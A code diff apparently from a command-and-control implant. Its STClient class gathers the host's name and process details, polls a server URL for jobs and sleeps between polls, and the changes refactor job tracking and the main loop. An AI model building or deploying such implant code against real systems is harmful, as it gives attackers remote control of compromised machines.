@@ -369,7 +369,7 @@ class STJob(Serializable):
         return self.__client.JOBS
 
     def checkin(self, args):
-        return self.__serialize__()
+        return self.__client.__serialize__()
 
     def sleep(self, args):
         self.__client.SLEEP = int(args)
@@ -381,10 +381,14 @@ class STJob(Serializable):
     def __str__(self):
         return "<Job {} ({})>".format(self.ID, self.STATE)
 
+    def __repr__(self):
+        return "<Job {} ({})>".format(self.ID, self.STATE)
+
 
 class STClient(Serializable):
     def __init__(self):
         self.__process = Process.GetCurrentProcess()
+        self.__jobs = []
 
         self.GUID = GUID
         self.SLEEP = 5000
@@ -401,7 +405,7 @@ class STClient(Serializable):
         self.PROCESS = self.__process.Id
         self.PROCESS_NAME = self.__process.ProcessName
         self.HOSTNAME = Environment.MachineName
-        self.JOBS = []
+        self.JOBS = len(self.__jobs)
         self.URL = str(URL)
         self.COMMS = Comms(self)
 
@@ -424,13 +428,10 @@ class STClient(Serializable):
         return Guid.NewGuid().ToString("n").Substring(0, length)
 
     def main(self):
-        self.COMMS.send_job_results(self, self.gen_random_string())
-
         while True:
             job = self.COMMS.get_job()
             if job:
-                print "Got job"
-                self.JOBS.append(STJob(self, job))
+                self.__jobs.append(STJob(self, job))
 
             Thread.CurrentThread.Join(self.SLEEP)
             #Thread.Sleep(client.SLEEP)
